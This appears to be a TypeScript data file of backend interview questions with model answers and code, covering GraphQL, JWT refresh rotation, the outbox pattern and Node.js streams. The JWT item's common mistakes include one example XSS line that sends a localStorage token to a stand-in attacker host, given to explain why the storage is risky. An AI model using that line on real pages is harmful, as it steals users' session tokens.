import { QuestionItem } from '../../types';

export const BACKEND_QUESTIONS: QuestionItem[] = [
  {
    id: 'be-1',
    slug: 'restful-vs-graphql-api-design',
    title: 'Explain the fundamental differences between RESTful APIs and GraphQL for data fetching in client applications.',
    questionText: 'Compare over-fetching vs under-fetching, network payloads, schema typing contracts, and HTTP caching implications.',
    category: 'Backend & API Architecture',
    categoryId: 'backend-architecture',
    topicId: 'api-design',
    subtopicId: 'rest-idempotency',
    difficulty: 'Easy',
    questionType: 'Conceptual',
    roleTarget: 'Backend Developer',
    roleIds: ['backend-dev', 'api-developer', 'fullstack-dev'],
    estimatedTime: '3 mins response',
    estimatedMinutes: 3,
    description: 'Compare over-fetching vs under-fetching, network payloads, schema typing contracts, and HTTP caching implications.',
    shortAnswer: 'REST uses resource-oriented URLs and standard HTTP methods with server-defined response shapes, benefiting from native HTTP caching (Varnish, Cloudflare) and predictable status codes. GraphQL uses a single POST endpoint with an explicit schema where clients specify exact fields needed, completely eliminating over-fetching and under-fetching at the cost of complex client-side caching and vulnerability to expensive nested queries.',
    detailedAnswer: '1. **Over-fetching & Under-fetching**:\n   In REST, fetching a user and their recent orders often requires either requesting `GET /users/123` (which returns 40 unneeded user fields: over-fetching) followed by `GET /users/123/orders` (under-fetching: requiring multiple network roundtrips). GraphQL allows client queries like `{ user(id: "123") { name orders(limit: 5) { total id } } }`, retrieving exactly what the view needs in one HTTP roundtrip.\n\n2. **HTTP Caching vs Application Caching**:\n   REST integrates naturally with RFC 7234 HTTP caching. Standard CDNs and browser caches can store `GET /products/456` with `ETag` and `Cache-Control: public, max-age=3600`. In GraphQL, almost all queries use `POST /graphql` with varying JSON request bodies, rendering generic edge HTTP caches ineffective without specialized GraphQL edge gateways (like Apollo Router/Stellate) or Persisted Queries.\n\n3. **The N+1 Problem & Batching**:\n   GraphQL servers easily suffer from the N+1 database query problem when resolving nested relational fields. Resolving 50 users and their profile avatars can trigger 51 separate SQL queries unless batching tools like Facebook\'s `DataLoader` are utilized.',
    codeExample: {
      language: 'javascript',
      code: `// Solving N+1 in GraphQL with DataLoader
const DataLoader = require('dataloader');

// Batches 50 individual authorId requests into ONE single SQL query:
// SELECT * FROM authors WHERE id IN (1, 2, 3... 50);
const authorLoader = new DataLoader(async (authorIds) => {
  const authors = await db.query('SELECT * FROM authors WHERE id = ANY($1)', [authorIds]);
  // Return authors in exact order of requested IDs
  const authorMap = new Map(authors.map(a => [a.id, a]));
  return authorIds.map(id => authorMap.get(id));
});

// GraphQL Resolver
const resolvers = {
  Book: {
    author: (book) => authorLoader.load(book.authorId),
  }
};`,
      explanation: 'DataLoader consolidates concurrent resolver calls occurring within a single event loop tick into a single bulk database query.'
    },
    commonMistakes: [
      'Assuming GraphQL is automatically faster than REST; unoptimized nested queries like `user { friends { friends { friends } } }` can take down databases with denial-of-service.',
      'Failing to implement query complexity analysis and depth limiting on public GraphQL endpoints.',
      'Ignoring REST HTTP status codes (GraphQL returns 200 OK even when the payload contains an `errors` array).'
    ],
    realWorldUseCases: [
      'Mobile apps operating over constrained 3G/4G networks where minimizing payload size and roundtrips is critical (GraphQL).',
      'Public third-party developer platforms (like Stripe/Twilio) where standard HTTP caching, curl compatibility, and universal client support are prioritized (REST).'
    ],
    tradeOffs: [
      'GraphQL gives frontend teams total velocity to request arbitrary data without backend endpoint changes, but shifts query complexity and performance burden to the backend resolver layer.'
    ],
    followUpQuestions: [
      'How do Persisted Queries and Automatic Persisted Queries (APQ) allow GraphQL to leverage CDN HTTP GET caching?',
      'How does gRPC compare to REST and GraphQL for internal service-to-service communication?'
    ],
    relatedQuestionIds: ['be-2', 'fs-1', 'be-3'],
    tags: ['API Design', 'REST', 'GraphQL', 'Backend', 'HTTP'],
    keywords: ['REST', 'GraphQL', 'over-fetching', 'under-fetching', 'DataLoader', 'N+1', 'HTTP caching'],
    companies: ['Shopify', 'GitHub', 'Meta', 'Netflix'],
    status: 'passed',
    statusLabel: 'Practiced 2x • High Score: 88%',
    isBookmarked: true
  },
  {
    id: 'be-2',
    slug: 'jwt-refresh-token-rotation-security',
    title: 'How do you design a secure token authentication flow using refresh token rotation and HttpOnly cookies to prevent XSS and CSRF?',
    questionText: 'Explain token lifetimes, family tracking, detecting compromised tokens, SameSite cookie attributes, and double-submit defenses.',
    category: 'Backend & API Architecture',
    categoryId: 'backend-architecture',
    topicId: 'auth-security',
    subtopicId: 'token-rotation',
    difficulty: 'Medium',
    questionType: 'System Design',
    roleTarget: 'Backend Developer',
    roleIds: ['backend-dev', 'api-developer', 'fullstack-dev'],
    estimatedTime: '4 mins response',
    estimatedMinutes: 4,
    description: 'Address cookie SameSite attributes, CSRF double-submit tokens, silent refresh logic, and handling compromised refresh families.',
    shortAnswer: 'Store short-lived JWT access tokens (5–15 mins) in client memory and long-lived refresh tokens (7–30 days) in Secure, HttpOnly, SameSite=Lax/Strict cookies. Each time the refresh token is exchanged, generate a brand new refresh token and invalidate the old one (rotation). Group tokens by family ID: if an already-used refresh token is presented, revoke the entire token family immediately as a credential theft alarm.',
    detailedAnswer: '1. **Access Token vs Refresh Token**:\n   - *Access Token*: Short TTL (10 minutes), stateless, verified via cryptographic signature (RSA-256 or Ed25519) using public keys without hitting the database. Held only in memory (JavaScript variable), immune to storage theft.\n   - *Refresh Token*: Long TTL (14 days), stateful, stored hashed in a database table. Used only at `/api/auth/refresh` to grant new access tokens.\n\n2. **XSS & CSRF Mitigation**:\n   - *XSS Defense*: By setting `HttpOnly; Secure; SameSite=Strict`, JavaScript cannot read or exfiltrate the refresh token cookie even if an attacker executes malicious scripts.\n   - *CSRF Defense*: Modern browsers enforce `SameSite=Lax` or `Strict`, which prevents cookies from attaching to cross-site requests. For high-security state mutations (POST/PUT/DELETE), require a custom header like `X-Requested-With` or a cryptographically signed CSRF anti-forgery token.\n\n3. **Refresh Token Rotation & Family Tracking**:\n   - When User exchanges `Refresh_A`, server invalidates `Refresh_A` and issues `Refresh_B` with the same `familyId`.\n   - If a malicious actor intercepted `Refresh_A` and attempts to use it later, the server detects that `Refresh_A` is already consumed. The server marks the entire `familyId` as compromised and immediately logs the user out on all devices.',
    codeExample: {
      language: 'typescript',
      code: `// Secure Cookie Settings in Node.js / Express
res.cookie('refreshToken', newRefreshToken, {
  httpOnly: true, // Prevents JavaScript document.cookie access (Mitigates XSS)
  secure: process.env.NODE_ENV === 'production', // Transmit only over HTTPS
  sameSite: 'strict', // Mitigates Cross-Site Request Forgery (CSRF)
  path: '/api/auth/refresh', // Scoped exclusively to refresh endpoint
  maxAge: 14 * 24 * 60 * 60 * 1000 // 14 days
});

// Refresh Token Reuse Detection Logic
async function handleRefresh(oldTokenString: string) {
  const tokenRecord = await db.tokens.findUnique({ where: { tokenHash: hash(oldTokenString) } });
  
  if (!tokenRecord) throw new UnauthorizedError('Invalid token');

  // ALARM: Token was already used! Potential token theft in progress!
  if (tokenRecord.isUsed) {
    await db.tokens.deleteMany({ where: { familyId: tokenRecord.familyId } });
    throw new SecurityBreachError('Token reuse detected. All sessions terminated.');
  }

  // Mark consumed and issue next in family
  await db.tokens.update({ where: { id: tokenRecord.id }, data: { isUsed: true } });
  const nextToken = generateSecureToken();
  await db.tokens.create({ data: { tokenHash: hash(nextToken), familyId: tokenRecord.familyId } });
  return nextToken;
}`,
      explanation: 'Tracking token families ensures that any replay of an old refresh token instantly invalidates all active sessions for that user.'
    },
    commonMistakes: [
      'Storing JWT access tokens in `localStorage` or `sessionStorage`, making them completely vulnerable to simple XSS attacks (`fetch("attacker.com?token=" + localStorage.getItem("token"))`).',
      'Using long-lived JWTs without revocation lists, leaving no way to kick compromised users off until the token expires.',
      'Failing to verify the `exp` (expiration) and `iss` (issuer) claims during signature validation.'
    ],
    realWorldUseCases: [
      'Enterprise SaaS platforms (Auth0, Okta, Stripe) managing secure authenticated sessions across web and mobile clients.',
      'Banking and healthcare portals with zero-trust session termination requirements.'
    ],
    tradeOffs: [
      'Refresh token rotation requires database writes on token refresh, trading pure statelessness for compromised credential protection.'
    ],
    followUpQuestions: [
      'How does asymmetric key signing (RS256 with JWKS) allow microservices to verify tokens without sharing secret keys?',
      'How do you handle race conditions when two concurrent browser tabs attempt to refresh the token simultaneously?'
    ],
    relatedQuestionIds: ['fs-2', 'be-1'],
    tags: ['Security', 'Authentication', 'JWT', 'Cookies', 'CSRF'],
    keywords: ['JWT', 'Refresh Token', 'Rotation', 'HttpOnly', 'SameSite', 'XSS', 'CSRF'],
    companies: ['Auth0', 'Stripe', 'Airbnb', 'Google'],
    status: 'unattempted',
    statusLabel: 'Not attempted yet',
    isBookmarked: true
  },
  {
    id: 'be-3',
    slug: 'transactional-outbox-pattern-microservices',
    title: 'How does the Transactional Outbox Pattern solve the dual-write consistency problem in distributed microservices?',
    questionText: 'What goes wrong when updating a SQL database and publishing an event to Apache Kafka in the same HTTP request, and how does Outbox guarantee reliability?',
    category: 'Backend & API Architecture',
    categoryId: 'backend-architecture',
    topicId: 'microservices-patterns',
    subtopicId: 'outbox-pattern',
    difficulty: 'Hard',
    questionType: 'System Design',
    roleTarget: 'Backend Developer',
    roleIds: ['backend-dev', 'distributed-systems-eng', 'software-architect'],
    estimatedTime: '5 mins response',
    estimatedMinutes: 5,
    description: 'Explain dual writes, two-phase commit (2PC) bottlenecks, Outbox database table, change data capture (Debezium/Kafka Connect), and at-least-once delivery.',
    shortAnswer: 'When a service writes to a database and then publishes to Kafka in a single request, failures cause partial writes (database commits but Kafka network drops, or vice versa). Two-phase commit (2PC) is slow and unavailable in cloud systems. The Transactional Outbox pattern solves this by writing the domain entity AND the outbound event into an `outbox` table in the SAME atomic local database transaction. An asynchronous process (like Debezium CDC or a polling worker) reads the outbox table and publishes events to Kafka with guaranteed at-least-once delivery.',
    detailedAnswer: '1. **The Dual-Write Hazard**:\n   Consider an order service: `db.orders.insert(order)` followed by `kafka.publish("OrderCreated", order)`. If Kafka is unreachable, the database holds an order that downstream services never know about. If you reverse the order, Kafka emits an event but database write could fail, leading to phantom processing.\n\n2. **The Outbox Architecture**:\n   - *Table*: An `outbox` table resides in the same database schema (`id`, `aggregate_type`, `payload`, `status`, `created_at`).\n   - *Atomic Commit*: When saving an order, the SQL transaction inserts into `orders` AND `outbox` simultaneously. The ACID properties guarantee that either both succeed or both roll back.\n\n3. **Event Relay Mechanics**:\n   - *Change Data Capture (CDC)*: Tools like **Debezium** tail the database Write-Ahead Log (Postgres WAL / MySQL binlog). When an outbox row is committed, Debezium streams it directly to Kafka without polling overhead.\n   - *Polling Publisher*: A lightweight worker queries `SELECT * FROM outbox WHERE status = \'PENDING\' FOR UPDATE SKIP LOCKED` and publishes to the broker, marking records as `SENT`.\n\n4. **Downstream Idempotency**:\n   Because the relay guarantees **at-least-once delivery**, consumers must be idempotent (using a deduplication table with the event\'s unique UUID).',
    codeExample: {
      language: 'typescript',
      code: `// Atomic Local Transaction with Prisma
await prisma.$transaction(async (tx) => {
  // 1. Mutate Domain Entity
  const order = await tx.order.create({
    data: { id: orderId, userId, total: 150.0, status: 'CONFIRMED' }
  });

  // 2. Insert into Outbox Table in the SAME transaction
  await tx.outbox.create({
    data: {
      id: crypto.randomUUID(),
      aggregateType: 'ORDER',
      aggregateId: order.id,
      eventType: 'OrderCreatedEvent',
      payload: JSON.stringify(order),
      status: 'PENDING'
    }
  });
});
// CDC engine (Debezium) reads Postgres WAL and ships event to Kafka asynchronously!`,
      explanation: 'Atomic local ACID transaction ensures the event cannot be created without the order, and the order cannot exist without the event.'
    },
    commonMistakes: [
      'Attempting to use distributed 2-Phase Commit (XA transactions) across Kafka and SQL databases in production; it introduces lock contention and single points of failure.',
      'Forgetting that the Outbox pattern guarantees At-Least-Once delivery, meaning consumers must handle duplicate messages using deduplication keys.',
      'Allowing the outbox table to grow infinitely without implementing an automated partitioning or pruning strategy for sent events.'
    ],
    realWorldUseCases: [
      'E-commerce checkouts notifying payment, shipping, and email notification microservices.',
      'Financial ledgers ensuring audit events are always recorded when funds transfer.'
    ],
    tradeOffs: [
      'Introduces eventual consistency (a consumer may receive the event 50–200ms after the database write commits) and requires consumer idempotency management.'
    ],
    followUpQuestions: [
      'How does Debezium read Postgres WAL logical replication slots without impacting query performance?',
      'How do you coordinate distributed rollbacks across multiple microservices using the Saga pattern?'
    ],
    relatedQuestionIds: ['sd-3', 'sd-4', 'db-3'],
    tags: ['Microservices', 'Distributed Systems', 'Architecture', 'Kafka', 'Transactions'],
    keywords: ['Transactional Outbox', 'CDC', 'Debezium', 'Kafka', 'dual write', 'Saga', 'ACID'],
    companies: ['Uber', 'Stripe', 'DoorDash', 'Amazon'],
    status: 'passed',
    statusLabel: 'Practiced 1x • High Score: 90%',
    isBookmarked: false
  },
  {
    id: 'be-4',
    slug: 'node-event-loop-streams-backpressure',
    title: 'How does Node.js handle memory backpressure when streaming multi-gigabyte files between readable and writable streams?',
    questionText: 'Explain highWaterMark, stream.write() return false, drain events, and stream.pipeline vs .pipe().',
    category: 'Backend & API Architecture',
    categoryId: 'backend-architecture',
    topicId: 'api-design',
    subtopicId: 'rest-idempotency',
    difficulty: 'Medium',
    questionType: 'Practical Trade-off',
    roleTarget: 'Backend Developer',
    roleIds: ['node-dev', 'backend-dev', 'fullstack-dev'],
    estimatedTime: '3 mins response',
    estimatedMinutes: 3,
    description: 'Understand stream buffer saturation, backpressure signaling, proper error propagation, and stream.pipeline memory leak prevention.',
    shortAnswer: 'When a readable stream emits chunks faster than a writable stream can write them (e.g. reading from fast NVMe SSD and sending over a slow 3G cellular network), the writable internal buffer fills up to highWaterMark (default 16KB). When full, `writable.write()` returns `false` (backpressure signal), signaling the readable stream to `.pause()`. Once the buffer clears, the writable emits a `drain` event, signaling the readable stream to `.resume()`. `stream.pipeline` automates this backpressure and guarantees proper error cleanup.',
    detailedAnswer: "1. The Backpressure Dilemma: If you read a 5GB video file from local disk and stream it to a slow client without backpressure, the entire 5GB will be buffered into Node.js process RAM in seconds, causing an out-of-memory crash. 2. The Backpressure Handshake: writable.write(chunk) returns false when highWaterMark is exceeded, signaling readable.pause(). Once the buffer flushes, it emits drain, signaling readable.resume(). 3. Why pipeline() replaces .pipe(): Legacy .pipe() does not destroy the readable stream on error or premature close, leaking file descriptors. Node.js stream.pipeline() handles bidirectional destruction and error propagation cleanly.",
    codeExample: {
      language: 'javascript',
      code: `const { pipeline } = require('stream/promises');
const fs = require('fs');
const zlib = require('zlib');

async function compressLargeFile(sourcePath, destinationPath) {
  try {
    // pipeline automatically handles backpressure, flow control, and clean destruction on error
    await pipeline(
      fs.createReadStream(sourcePath),
      zlib.createGzip(),
      fs.createWriteStream(destinationPath)
    );
    console.log('Streaming compression completed without memory spikes!');
  } catch (err) {
    console.error('Pipeline failed with proper file descriptor cleanup:', err);
  }
}`,
      explanation: 'stream/promises pipeline streams gigabyte-scale datasets keeping process memory under 30MB.'
    },
    commonMistakes: [
      'Using `fs.readFile()` on user uploads, buffering the entire file into memory before processing.',
      'Using `readable.pipe(writable)` without attaching error listeners to both streams, leaving unhandled exception crashes.',
      'Ignoring the boolean return value of `res.write()` in HTTP response streaming.'
    ],
    realWorldUseCases: [
      'Streaming large CSV exports with millions of rows from PostgreSQL directly to browser downloads.',
      'Real-time audio/video transcoding pipelines using FFmpeg child processes and Node.js streams.'
    ],
    tradeOffs: [
      'Streaming code requires handling chunk boundaries and asynchronous stream state transitions compared to straightforward in-memory string processing.'
    ],
    followUpQuestions: [
      'How do Node.js Transform streams allow streaming encryption and hashing on the fly?',
      'How does Node.js 20+ Web Streams API (ReadableStream, TransformStream) align with browser standards?'
    ],
    relatedQuestionIds: ['be-1', 'fe-6'],
    tags: ['Node.js', 'Streams', 'Memory', 'Backpressure', 'Performance'],
    keywords: ['streams', 'backpressure', 'highWaterMark', 'drain', 'pipeline', 'buffer'],
    companies: ['Netflix', 'Cloudflare', 'PayPal', 'Amazon'],
    status: 'passed',
    statusLabel: 'Practiced 1x • High Score: 87%',
    isBookmarked: false
  }
];
